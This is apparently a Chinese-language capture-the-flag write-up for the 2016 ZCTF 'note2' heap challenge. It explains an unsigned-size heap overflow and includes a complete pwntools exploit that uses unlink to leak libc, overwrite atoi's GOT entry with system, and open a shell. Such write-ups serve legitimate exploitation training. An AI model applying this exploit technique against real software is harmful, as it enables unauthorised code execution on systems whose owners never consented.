---
title: 2016 ZCTF note2
date: 2018-10-20 10:00:29
tags: [unlink]
---

### 程序信息
note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=46dca2e49f923813b316f12858e7e0f42e4a82c3, stripped
```
[+] checksec for '/home/pollux/note2/note2'
Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

### 程序功能
通过IDA和运行程序，知道程序有4个功能
- new note：新建一个note
- show note
- edit note：可选为覆盖还是续写
- 释放note

### 程序漏洞
1. 在 new note 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容，但是读取的循环变量 i 是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。
```
unsigned __int64 __fastcall sub_4009BD(__int64 a1, __int64 a2, char a3)
{
  char v4; // [rsp+Ch] [rbp-34h]
  char buf; // [rsp+2Fh] [rbp-11h]
  unsigned __int64 i; // [rsp+30h] [rbp-10h]
  ssize_t v7; // [rsp+38h] [rbp-8h]

  v4 = a3;
  for ( i = 0LL; a2 - 1 > i; ++i )
  {
    v7 = read(0, &buf, 1uLL);
    if ( v7 <= 0 )
      exit(-1);
    if ( buf == v4 )
      break;
    *(_BYTE *)(i + a1) = buf;
  }
  *(_BYTE *)(a1 + i) = 0;
  return i;
}
```

2. 程序在每次 edit note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有把指针设置为 NULL。

### 思路
1. 创建三个chunk，第二个chunk的大小设置为0，这样该chunk释放后就被归为fast bin，当我们再次申请0大小的chunk时，该chunk就会被分配出去，因为该chunk位于两个chunk之间，此时就可以利用第一个漏洞，对第三个chunk进行溢出，修改其chunk头，进行free(chunk3)，触发unlink(1)。
2. 利用unlink，通过程序的show note功能获取atoi的地址，进而算出system的地址，然后修改atoi@got指针中的地址为system的地址，获得shell。

### 疑惑
第二个漏洞没有看到利用的地点

###EXP
```
#!/usr/bin/env python
from pwn import *

p = process('./note2')
note2 = ELF('./note2')
libc = ELF('./libc.so.6')
ptr = 0x602120

DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = "debug")

def new_note(length,content):
	p.recvuntil('option--->>')
	p.sendline('1')
	p.recvuntil('Input the length of the note content:(less than 128)')
	p.sendline(str(length))
	p.recvuntil('Input the note content:')
	p.sendline(content)

def show_note(idx):
	p.recvuntil('option--->>')
        p.sendline('2')
        p.recvuntil('Input the id of the note:')
        p.sendline(str(idx))

def edit_note(idx,choice,content):
	p.recvuntil('option--->>')
	p.sendline('3')
	p.recvuntil('Input the id of the note:')
	p.sendline(str(idx))
	p.recvuntil('do you want to overwrite or append?[1.overwrite/2.append]')
	p.sendline(str(choice))
	p.recvuntil('TheNewContents:')
	p.sendline(content)

def delete_note(idx):
	p.recvuntil('option--->>')
	p.sendline('4')
	p.recvuntil('Input the id of the note:')
	p.sendline(str(idx))

def exp():
	p.recvuntil('Input your name:')
	p.sendline('1')
	p.recvuntil('Input your address:')
	p.sendline('1')
	payload = 'a'*8+p64(0x61)+p64(ptr-0x18)+p64(ptr-0x10)
	payload = payload.ljust(0x60,'b')
	payload += p64(0x60)
	new_note(0x80,payload)  #use for unlink
	new_note(0,'d'*16)		#fastbin
	new_note(0x80,'a'*8)

	delete_note(1)		#free chunk to fastbin
	payload = 'a'*16 + p64(0x80+0x20) + p64(0x90) #overwrite chunk2
	new_note(0,payload)
	delete_note(2)		#trigger to unlink chunk0
	payload = 'a'*0x18 + p64(note2.got['atoi'])
	edit_note(0,1,payload)
	show_note(0)
	p.recvuntil('Content is ')
	atoi_addr = p.recvuntil('\n',drop=True).ljust(8,'\00') #str
	atoi_addr = u64(atoi_addr) #int
	log.success('atoi_addr:'+hex(atoi_addr))

	libc_base = atoi_addr - libc.symbols['atoi']
	system_addr = libc_base + libc.symbols['system']
	log.success('system_addr:'+hex(system_addr))

	payload = p64(system_addr)
	edit_note(0,1,payload) #make atoi become system

	p.recvuntil('option--->>')
	p.sendline('/bin/sh;')
	p.interactive()

exp()
```
